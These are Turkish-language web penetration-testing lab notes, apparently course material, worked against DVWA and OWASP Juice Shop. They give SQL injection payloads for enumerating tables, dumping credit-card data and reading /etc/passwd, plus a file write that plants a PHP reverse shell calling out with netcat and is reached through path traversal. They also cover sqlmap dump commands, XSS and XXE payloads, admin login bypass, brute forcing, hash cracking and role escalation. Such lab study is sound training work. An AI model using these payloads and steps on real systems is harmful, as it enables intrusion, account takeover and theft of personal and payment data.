![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2018.56.47.jpeg)

- SQL açığı test edilirken, giriş yapma sırasında ```ORDER BY```'da kullanılabiliyor

- | Kullanıcı Adı | jamess'# |
  | --- | --- |
  | Password | 123dasdas' ORDER BY 1# |

> ## SQL Union Select

> ## SQL Union Select Sütun Sayısı Öğrenme

- Database'dei sütun sayısını öğrenirken ```UNION SELECT``` kullanırız

- | Kullanıcı Adı | jamess' union select 1,1,1,1,1# | 
  | --- | --- |
  | Password | 123dasdas|

- Şekinde tek tek deniyoruz (jamess' union select 1#, jamess' union select 1,1#, jamess' union select 1,1,1#...)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2019.11.52.jpeg)

- Database'deki hangi sütunların kullanıldığını öğrenmemiz gerekiyor bunun için (örneğin 5 sütunlu bir site);
- | Kullanıcı Adı | jamess' union select 1,2,3,4,5# | 
  | --- | --- |
  | Password | 123dasdas|
  
![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2019.12.35.jpeg)

- 2,3 ve 4. sütunların kullanıldığını öğrendik

> ## SQL Union Select Database Öğrenme 

- Database ismi, kullanıcı bilgisi, version vs öğrenebiliriz bunu için;

- | Kullanıcı Adı | jamess' union select 1,database(),user(),version(),5# | 
  | --- | --- |
  | Password | 123dasdas|

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2019.16.13.jpeg)

> ## SQL Union Select Tablo İsimlerini Öğrenme

- ```MYSQL```: İnternette duran sql sunucularıdır 
- ```MYSQL``` içinde ```information_schema``` vardır ve bilgiler onun içinde saklanır
- Tablo isimilerni öğrenirken bizde ```information_schema```'yı kullanıyoruz

- | Kullanıcı Adı | jamess' union select 1,table_name,null,null,5 from information_schema.tables# | 
  | --- | --- |
  | Password | 123dasdas|

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2019.22.51.jpeg)

- Ancak bu yöntemle web server'ındaki tüm tablo isimlerini görürüz bunu filtrelemek için ```WHERE``` kullanılır
  
- | Kullanıcı Adı | jamess' union select 1,table_name,null,null,5 from information_schema.tables where table_schema='{database ismi}'# | 
  | --- | --- |
  | Password | 123dasdas|

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2019.30.00.jpeg)

> ## SQL Union Select Sütun İsimlerini Öğrenme

- | Kullanıcı Adı | jamess' union select 1,table_name,null,null,5 from information_schema.columns where table_name='{tablo isimi}'# | 
  | --- | --- |
  | Password | 123dasdas|

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2019.31.04.jpeg)
	
> ## SQL Union Select Sütun İçindeki Bilgileri Öğrenme

-Sütun içindeki verileri görmek için sütun isimlerini yazıyoruz

- | Kullanıcı Adı | jamess' union select 1,ccnumber,ccv,expiration,5 from credit_cards# | 
  | --- | --- |
  | Password | 123dasdas|
  
![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2019.36.01.jpeg)

# Blind SQL Injection

- Sunucuda çalışan komutun görünmemesi demektri. Komut çalışır ancak hata verip vermediğini biz göremeyiz
- ```DVWA -> Blind SQL Inj.```'a giriyoruz
- ```User ID: 1' AND 1=1#``` deniyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a07c42c309f95917cee20dfd39aee5ae5bf41705/Pictures/WhatsApp%20Image%202022-09-16%20at%2012.23.40.jpeg)

- Eğer sonuç alabildiysek şimdi tablo isimlerini görebilir miyiz test ediyoruz 
- ```User ID: 1' union select 1,table_name from information_schema.tables#``` deniyoruz. (1,table_name,2,3,4... şeklinde sonuç alana kadar artırıyoruz)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a07c42c309f95917cee20dfd39aee5ae5bf41705/Pictures/WhatsApp%20Image%202022-09-16%20at%2012.28.04.jpeg)

- Database isimi ve kullanıcı öğrenmek için;
- ```1' union select database(),user()#``` yazıyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a07c42c309f95917cee20dfd39aee5ae5bf41705/Pictures/WhatsApp%20Image%202022-09-16%20at%2012.34.41.jpeg)

# DVWA SQL Injection

- Bazı sitelerde güvenlik amacıyla komut içerisindeki birşeyler filtrelenmiş olabilir (',#,AND,OR vb)
- DVWA security level'ini medium'a alıyoruz
- ```User ID: 1' AND 1=1#``` deniyoruz ve hata mesajı alıyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a07c42c309f95917cee20dfd39aee5ae5bf41705/Pictures/WhatsApp%20Image%202022-09-16%20at%2012.37.28.jpeg)

- Google'dan ```sql injection cheat sheet github``` şeklinde arama yapıyoruz ve deneyebileceğimiz opsiyonları görürüz
  - ```' AND 1=1#``` -> ```' AND 40=40#```
  - ```' AND 1=1#``` -> ```' AND 1=1½23```
  - ```' AND 1=1#``` -> ```'+AND+1=1#```
  - ```' AND 1=1#``` -> ```%27%20AND%201=1%23```
  - ```'union select 1,2,3,4,5``` -> ```' uNiON sELEct 1,2,3,4,5```
  - ```' AND 1=1#``` -> ```%27+AND+1=1#```
  - ```' AND 30=30#``` -> ```%27 AND 30=30#```

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a07c42c309f95917cee20dfd39aee5ae5bf41705/Pictures/WhatsApp%20Image%202022-09-16%20at%2012.45.51.jpeg)

> ## SQL Injection HEX Vermek

- Komut içindeki filtrelenmiş şeylerden nası kaçıcağımızı bulduktan sonra komutları o şekilde yazarak sütun ismi, veritabanı ismi gibi şeyleri çekebiliriz
- Bazı durumlarda filtreden kurtulmak için yazdığımız şeyleri ```text``` olarak değil ```hex``` olarak vermemiz gerekebilir (e.g. ```'``` -> 0x27)
- ```Text```'i ```Hex```'e çevirmek için ```burpsuite decoder``` kısımına bakabiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a07c42c309f95917cee20dfd39aee5ae5bf41705/Pictures/WhatsApp%20Image%202022-09-16%20at%2013.04.36.jpeg)

- ```1%27union select 1,table_name from information_schema.tables where table_schema='dvwa'``` yerine ```1%27 union select 1,table_name from information_schema.tables where table_schema=0x64767761``` şeklinde yazabiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a07c42c309f95917cee20dfd39aee5ae5bf41705/Pictures/WhatsApp%20Image%202022-09-16%20at%2013.08.13.jpeg)

# Database'in Bulunduğu Sunucudaki Dosyaları Okuma ve Yazma
> ## Veri Okuma

- ```User ID: 1' union select 1,load_file(' /etc/passwd')#``` yazarak o dosyayı okuyabiliyor muyuz diye deniyoruz
- Bazı durumlarda 1 yerine ```null``` yazmak gerekebiliyor
- Duruma göre yine bazı karakter filtrelemerinden kaçmak için karakterleri ya da kelimeleri farklı şekilde yazmamız gerekebilir

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a07c42c309f95917cee20dfd39aee5ae5bf41705/Pictures/WhatsApp%20Image%202022-09-16%20at%2013.47.18.jpeg)

> ## Veri Yazma

- ```User ID: 1' union select 1,'test' into outfile '/tmp/test.txt'#``` yazarak "tmp" içine "test.txt" oluşturup onun içine "test" yazdırabiliriz
- İlk olarak ```/tmp``` içine yazdırmayı deneriz eğer oraya yazdıramazsak başka hiçbir yere yazdıramayız demektir
- Komutu yazdırıp yazdıramadığımızı test etmek için ```load_file``` çalıştırabiliriz
- ```User ID: 1' union select 1,load_file(' /tmp/test.txt')#```

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a07c42c309f95917cee20dfd39aee5ae5bf41705/Pictures/WhatsApp%20Image%202022-09-16%20at%2013.50.39.jpeg)

> ## PHP Dosyasını Veri Olarak Eklemek

- Veri yazdırabileceğimizi öğrendik artık bunu kullanarak sunucu içine ```.php``` dosyası ekleyerek shell oluşturmayı deneyeceğiz
- ```<?passthru("nc 192.168.123.123 1234 -e /bin/sh");?>``` kodunu kullanacağız (```/bin/sh``` yerine ```/bin/bash``` yazabiliriz)
- ```User ID: 1' union select("nc 192.168.123.123 1234 -e /bin/sh");?> infot outfile '/tmp/myshell.php'#``` yazıp kodu yüklemeyi deniyoruz ("/tmp/myshell.php" yerine linux sunucu ise "/var/www/{site adı}/myshell.php" deneyebiliriz
- Terminali açarak ```nc -nvlp 1234``` ile dinlemeye başlıyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a07c42c309f95917cee20dfd39aee5ae5bf41705/Pictures/WhatsApp%20Image%202022-09-16%20at%2014.14.07.jpeg)

- Siteye dönüyoruz ve URL kısmına gelerek php dosyasını yüklediğimiz konuma gitmeyi deniyoruz (/tmp/myshell.php)
- Bunun için ```http://192.168.126.132/dvwa/vulnerabilities/fi/?page=../../../../../tmp/myshell.php``` kullanıyoruz ("../" kullanarak geri gidiyoruz ve kaç tane "../" kullanıcağımızı deniyoruz)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a07c42c309f95917cee20dfd39aee5ae5bf41705/Pictures/WhatsApp%20Image%202022-09-16%20at%2014.17.45.jpeg)

- Açık shelli tespit ettikten sonra ls, pwd, cd gibi komutlarla gezinebiliriz

# SQL Map

- Sızma testi yapacağımız sitede SQL açığı var mı diye test edebileceğimiz bir framework'tür 
- Siteye girdikten sonra giriş yapmayı deniyoruz ve URL'yi kopyalıyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a07c42c309f95917cee20dfd39aee5ae5bf41705/Pictures/WhatsApp%20Image%202022-09-16%20at%2016.11.55.jpeg)

- Terminali açıyoruz, ```sqlmap -u "http://192.168.123.123...{site URL'si}"``` olarak giriyoruz ve açık var mı test ediyoruz
- ```sqlmap -u "http://192.168.123.123..." --current -db``` -> Sitenin güncel databaselerini gösterir
- ```sqlmap -u "http://192.168.123.123..." --tables -D owasp10``` -> "owasp10" içindeki tabloları gösterir
- ```sqlmap -u "http://192.168.123.123..." --columns -T credit_cards -D owasp10``` -> "owasp10" içindeki "credit_cards" tablosundaki sütun isimlerini gösterir
- ```sqlmap -u "http://192.168.123.123..." -T credit_cards -D owasp10 --dump``` -> "credit_cards" içindeki bilgileri gösterir
  - ```-D```: Database İsmi
  - ```--columns```: Sütunları Gösterir
  - ```--tables```: Tabloları Gösterir
  - ```--current -db```: Aktif Databaseleri Gösterir
  - ```-T```: Tablo ismi

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a07c42c309f95917cee20dfd39aee5ae5bf41705/Pictures/WhatsApp%20Image%202022-09-16%20at%2016.15.09.jpeg)


# Heroku

- ```owaspjuiceshop``` sitesine üye oluyoruz
- [owaspjuiceshop](https://github.com/atilsamancioglu/juice-shop) gidip ```Deploy to Heroku```

# Juice Shop 
> # Level 1
> ## ScoreBoard Bulma

- Site içerisinde bir yerlede ```scoreboard``` sayfası gizlenmiş ve bunu bulmaya çalışıyoruz
- Bunu bulurken ```dirb``` gibi frameworklerde kullanılabilir ancak biz JS kodlarını kullanarak bulmayı deneyeceğiz
- Sağ tıklayıp ```inspect``` diyoruz
- ```Debugger``` kısmında sitenin JS kodları bulunur
- O kodlar içerisinden ```CTRL+F``` diyerek ```scoreboard```'u aratıyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/6c0922cf702c90d5e189b89c783343abc8cec776/Pictures/WhatsApp%20Image%202022-09-17%20at%2016.10.29.jpeg)

- ```Path:score-board```'u bulduk artık URL sonuna ```/score-board``` yazarak o sayfaya gidebiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/6c0922cf702c90d5e189b89c783343abc8cec776/Pictures/WhatsApp%20Image%202022-09-17%20at%2016.10.58.jpeg)

- ```! path'ler gizli subdomainlerdir```

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/6c0922cf702c90d5e189b89c783343abc8cec776/Pictures/WhatsApp%20Image%202022-09-17%20at%2017.39.57.jpeg)

> ## Nikto

- Nikto bir zaafiyet arama framework'üdür
- Nikto kullanarak bazı açıkları bulabilir, site IP'sine, Portuna vb bilgilere ulaşabiliriz
- ```nikto -h htts://...``` ile taramayı başlatırız

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/6c0922cf702c90d5e189b89c783343abc8cec776/Pictures/WhatsApp%20Image%202022-09-17%20at%2016.37.08.jpeg)

> ## DOM XSS

- Siteye birşeyler yazabileceğimiz yerlere (search, login, feedback vs.) JS kodu yazıp deniyoruz
- Search kısmına ```<iframe src="javascript:alert('XSS')">``` yazmayı deniyoruz ve bize alert veriyor

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/6c0922cf702c90d5e189b89c783343abc8cec776/Pictures/WhatsApp%20Image%202022-09-17%20at%2016.42.26.jpeg)

- ```DOM (Document Object Model) HTML kdlarının bir şemasının çıkarılmasıdır. HTML DOM'da yapılan değişiklik demek sunucuya gitmeden siteden yapılan değişiklikler demektir. Sitede XSS filtresi varsa ancak DOM açığıda varsa yinede JS kodu çalışır çünkü kod sunucuya gitmez, sunucuda çalışmaz```
- Artık açık bulunan link başkasına atılarak ve kod içeriği değiştirilerek başka kullanıcılar hacklenebilir

> ## Kullanıcı Oluşturma

- ```DRY Principle```: Don't Repeat Yourself demektir. Yani yazılan kodların aynı şekilde kendini tekrar ederek yazılmamasıdır
- Login yerine giriyoruz
- Şifreleri farklı girince hata veriyor ancak ilk şifreleri aynı girip daha sonra ilk şifreyi değiştirirsek hata vermiyor

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/6c0922cf702c90d5e189b89c783343abc8cec776/Pictures/WhatsApp%20Image%202022-09-17%20at%2016.57.30.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/6c0922cf702c90d5e189b89c783343abc8cec776/Pictures/WhatsApp%20Image%202022-09-17%20at%2016.58.59.jpeg)

> ## Redirect Outdated Whitelist

- Site içeiriden farklı bir adrese gidebilir miyiz diye deniyoruz
- Sağ tıklayıp ```inspect``` diyoruz
- Debugger kısmındaki JS kodlarında ```redirect``` aratıyoruz
- Ve bir URL adresi buluyoruz, link sonuna bu URL adresini ekleyerek farklı bir yere gidiyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/6c0922cf702c90d5e189b89c783343abc8cec776/Pictures/WhatsApp%20Image%202022-09-17%20at%2017.20.10.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/6c0922cf702c90d5e189b89c783343abc8cec776/Pictures/WhatsApp%20Image%202022-09-17%20at%2017.20.49.jpeg)

> ## Sıfır Yıldızlı Geri Bildirim

- 0 yıldızlı geri bildirim yapmayı deniyoruz bunun için 2 yöntem kullanabiliriz

### 1. Burpsuite

- Feedback kısmını dolduruyoruz
- ```Burpsuite```'i açıp ```Intercept is on``` yapıyoruz 
- Girdiğimiz parametreleri görene kadar ```forward```lıyoruz
- ```Rating```'i "0" yapıyoruz ve forwardlamaya devam ediyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/6c0922cf702c90d5e189b89c783343abc8cec776/Pictures/WhatsApp%20Image%202022-09-17%20at%2017.26.19.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/6c0922cf702c90d5e189b89c783343abc8cec776/Pictures/WhatsApp%20Image%202022-09-17%20at%2017.26.56.jpeg)


### 2. HTML

- Sağ tıklayıp ```inspect``` diyoruz
- Form'u dolduruyoruz ama yıldız seçmiyoruz
- ```Inspector``` kısmından buton'u arıyoruz
- ```Disabled="true"``` yerine ```enabled="true"``` yazıyoruz ve submit butonu yıldız seçmeden de submit edilebilir hale geliyor

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/6c0922cf702c90d5e189b89c783343abc8cec776/Pictures/WhatsApp%20Image%202022-09-17%20at%2017.32.40.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/6c0922cf702c90d5e189b89c783343abc8cec776/Pictures/WhatsApp%20Image%202022-09-17%20at%2017.34.24.jpeg)

> # Level 2
> ## Başkasının Sepetini Görüntüleme

- Sepetimize bişeyler ekleyip sepetimize gidiyoruz
- Sağ tık yapıp ```inspect``` diyoruz
- ```Storage``` kısmına girip ```session storage```'e tıklıyoruz
- ```bid``` değerini değiştiriyoruz ve sayfayı yeniliyoruz 

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/6c0922cf702c90d5e189b89c783343abc8cec776/Pictures/WhatsApp%20Image%202022-09-17%20at%2017.55.39.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/6c0922cf702c90d5e189b89c783343abc8cec776/Pictures/WhatsApp%20Image%202022-09-17%20at%2017.55.59.jpeg)

- Artık ```bid```'sini girdiğimiz kullanıcının sepetini görüntülüyoruz
- İster o kullanıcının ```itemTotal```'ini değiştirerek toplam sepet tutarını değiştirebiliriz

> ## SQL Injection

- SQL enjeksiyonunda site içerisinde SQL kodlarını çalıştırmayı deniyoruz
- Login ksımına giriyoruz

- | Kullanıcı Adı | ahmet@gmail.com |
  | --- | --- |
  | Password | 123456' AND 1=1# |

- Deniyoruz ve hata alıyoruz
- ```Burpsuite``` açıyoruz, ```intercept is on``` diyoruz ve tekrar giriş yapmayı deniyoruz
- Şifre ve mail görünene kadar kadar ```forward```'lıyoruz
- Şifre ve mail'i görünce sağ tıklayıp ```send to repeater``` diyoruz
- ```Repeater```'a yollayıp sonuçları daha hızlı görebiliyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/51191900139fadefaf7aaa5a294782f22f30c57c/Pictures/WhatsApp%20Image%202022-09-18%20at%2013.24.35.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/51191900139fadefaf7aaa5a294782f22f30c57c/Pictures/WhatsApp%20Image%202022-09-18%20at%2013.25.41.jpeg)

- Deniyoruz. Burpsuite'den yakalayarak hata mesajını not alıyoruz ve farklı kodlarda denemeye devam ediyoruz 
- ```SELECT * FROM Users WHERE email = 'ahmet@gmail.com' AND 1=1#' AND password = 'c4ca4238a0b923820dcc509a6f75849b' AND deletedAt IS NULL```

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/51191900139fadefaf7aaa5a294782f22f30c57c/Pictures/WhatsApp%20Image%202022-09-18%20at%2013.26.52.jpeg)

- Simgeleri değiştirerek deniyoruz (;,+,%27,%20 vs)



> ## Admin Olarak Giriş

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/51191900139fadefaf7aaa5a294782f22f30c57c/Pictures/WhatsApp%20Image%202022-09-18%20at%2013.29.36.jpeg)

- Yazarak giriş yaparsak siteye admin hesabuyka giriş yapmış oluruz çünkü ya verilen mail adresiyle giriş yap ya da 1=1 ise girip yap diyoruz. 1=1 olduğu için ilk kullanıcı kim ise o olarak giriş yaparız ve genelde ilk kullanıcı admin olur
- Giriş yaptıktan sonra o hesaptaki kayıtlı kart bilgilerine, adres bilgilerine vb bilgilere erişebiliriz 

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/51191900139fadefaf7aaa5a294782f22f30c57c/Pictures/WhatsApp%20Image%202022-09-18%20at%2013.31.49.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/51191900139fadefaf7aaa5a294782f22f30c57c/Pictures/WhatsApp%20Image%202022-09-18%20at%2013.37.08.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/51191900139fadefaf7aaa5a294782f22f30c57c/Pictures/WhatsApp%20Image%202022-09-18%20at%2013.37.26.jpeg)

> ## Kullanıcı Şifresi Öğrenme

- Kullanıcı adı veya mail'ini bildiğimiz kullanıcıların şifresini öğrenmek için birkaç yöntem kullanabiliriz 

### 1. Cookie Bilgilerini Kırma

- SQL enjeksiyonu yaparak hesaba giriş yapıyoruz
- Siteye sağ tıklayıp ```inspect``` diyoruz
- ```Storage``` kısmından ```cookie```'leri inceliyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/51191900139fadefaf7aaa5a294782f22f30c57c/Pictures/WhatsApp%20Image%202022-09-18%20at%2013.47.01.jpeg)

- ```Token``` diye bir kısım var burdaki değeri inceliyoruz
- Token şifrelenmiş durumda bunu kırmayı deneyeceğiz
- Google'a ```token decode``` yazıp arıyoruz. Birkaç farklı siteye bakabiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/51191900139fadefaf7aaa5a294782f22f30c57c/Pictures/WhatsApp%20Image%202022-09-18%20at%2013.51.12.jpeg)

- E-mail, role ve password gibi bilgilere ulaştık ancak ```password```'da ayrı olarak şifrelenmiş durumda
- Şimdi password'un ne kullanılarak şifrelendiğini bulmamız gerekiyor bunun için
- Terminalden ```hash-identifier``` çalıştırıyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/51191900139fadefaf7aaa5a294782f22f30c57c/Pictures/WhatsApp%20Image%202022-09-18%20at%2013.54.53.jpeg)

- Şifremizi yapıştırıyoruz ve çalıştırıyoruz
- ```Hash-identifier``` bize yazılan şeyin ne kullanılarak şifrelendiğini söyler

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/51191900139fadefaf7aaa5a294782f22f30c57c/Pictures/WhatsApp%20Image%202022-09-18%20at%2013.55.10.jpeg)

- Google'a ```md5 decryption``` yazıp aratıyoruz 
- Çıkan sitelerden birine girip şifreyi yapıştırıyoruz ve şifreyi kırıyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/51191900139fadefaf7aaa5a294782f22f30c57c/Pictures/WhatsApp%20Image%202022-09-18%20at%2013.56.40.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/51191900139fadefaf7aaa5a294782f22f30c57c/Pictures/WhatsApp%20Image%202022-09-18%20at%2013.57.07.jpeg)

### 2. Brute Force

- Kullanıcı adını veya mailini bildiğimiz hesabın şifresini brute force yöntemi ile elde edebiliriz
- ```Burpsuite intercept is on``` yapıyoruz
- Mail adresini girip rastgele bir şifre gidiyoruz ve yakalıyoruz
- Şifre ve mail görünene kadar forwardlıyoruz 
- Şifre ve mail adresi görününce sağ tıklayıp ```Send to Intruder``` diyoruz
- ```Attack type```'ı ```sniper``` yapıyoruz
- "Clear" yapıp şifreyi seçerek "add" diyoruz
- ```Payload``` kısmından wordlist'i seçiyoruz ve ```Attack``` diyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/51191900139fadefaf7aaa5a294782f22f30c57c/Pictures/WhatsApp%20Image%202022-09-18%20at%2014.05.33.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/51191900139fadefaf7aaa5a294782f22f30c57c/Pictures/WhatsApp%20Image%202022-09-18%20at%2014.16.06.jpeg)

> ## Admin Panelini Bulmak](#Admin-Panelini-Bulmak)

- Admin panel'ini bulmayı deneyeceğiz 
- Sağ tıklayıp ```inspect``` diyoruz
- ```Debugger``` kısmında ```CTRL+F``` ile ```admin``` aratıyoruz
- ```Path:administration```'ı  buluyoruz
- URL sonuna ```/administration``` ekleyerek admin paneline gidebiliriz
- Admin panelinden diğer kullanıcıların bilgilerini ve siteye gelen feedback'leri görebiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/51191900139fadefaf7aaa5a294782f22f30c57c/Pictures/WhatsApp%20Image%202022-09-18%20at%2014.18.20.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/51191900139fadefaf7aaa5a294782f22f30c57c/Pictures/WhatsApp%20Image%202022-09-18%20at%2014.20.02.jpeg)

> ## XEE Açıkları](#XEE-Açıkları)

- Site içine ```.xml``` dosyası yükleyebilme açığıdır
- XSS'de yaptıklarımızdan daha fazlasını yapabiliriz
- ```XML``` en çok android uygulama yazarken kullanılır
- "Complaint" kısmında hem mesaj hem dosya yükleyebileceğimiz yer var 
- Hangi tür dosyaları yükleyebileceğimize bakıyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/51191900139fadefaf7aaa5a294782f22f30c57c/Pictures/WhatsApp%20Image%202022-09-18%20at%2014.36.47.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/51191900139fadefaf7aaa5a294782f22f30c57c/Pictures/WhatsApp%20Image%202022-09-18%20at%2014.36.37.jpeg)

- Sadece ```.zip``` ve ```.pdf``` dosyalarına izin veriyor
- Şimdi bunları değiştirmeyi deniyoruz
- Sağ tıklayıp ```inspect``` yapıp JS kodlarına gidiyoruz
- CTRL+F yapıp "zip", "pdf", "file" gibi şeyleri arıyoruz
- ```.xml``` dosyası yollayabildiğimizi görüyoruz ve eğer ```.xml``` yollayabiliyorsak ```XXE``` açığına bakabiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/51191900139fadefaf7aaa5a294782f22f30c57c/Pictures/WhatsApp%20Image%202022-09-18%20at%2014.42.51.jpeg)

- ```.xml``` dosyasını server'a yollarsak orda da işlem yapabiliriz
- Google'dan ```XXE Payload GitHub``` arıyoruz 
- Sitelerden birine girerek kodları deneyebiliriz
``` 
<?xml version="1.0"?>
<!DOCTYPE data 
[
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```
- Bu kodu leafpad vb uygulama kullanarak ```.xml``` dosyası oluşturup onun içine yazıyoruz
- Ve submit ediyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/51191900139fadefaf7aaa5a294782f22f30c57c/Pictures/WhatsApp%20Image%202022-09-18%20at%2014.56.49.jpeg)

- Admin paneline girip kodun gidip gitmediğini kontrol edebiliriz

# Level 3

> ## Admin Yetkileriyle Kullanıcı Oluşturma

- Admin yetkilerine sahip bir kullanıcı oluşturmayı deniyoruz 
- Login bilgilerimizi dolduruyoruz
- ```Burpsuite intercept is on``` yapıyoruz
- Login yapıp burpsuite'den yakalıyoruz
- Girdiğimiz parametreleri görene kadar forward'lıyoruz
- ```Send to Repeater``` diyoruz
- ```Repeater```'a giriyoruz ve send diyoruz
- ```Response``` kısmında ```role``` parametresi var ve ```customer``` yazıyor

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/51191900139fadefaf7aaa5a294782f22f30c57c/Pictures/WhatsApp%20Image%202022-09-18%20at%2015.58.45.jpeg)

- Yani yeni kullanıcı oluştururken role default olarak customer için ayarlanmış yetkilere sahip olur
- Bunu ```admin``` yapmayı deneyebiliriz bunu için
- ```Request``` kısmına ```"role":"admin"``` ekliyoruz ve send diyoruz
- Ve yeni oluşturduğumuz kullanıcı ```admin``` yetkilerine sahip oluyor

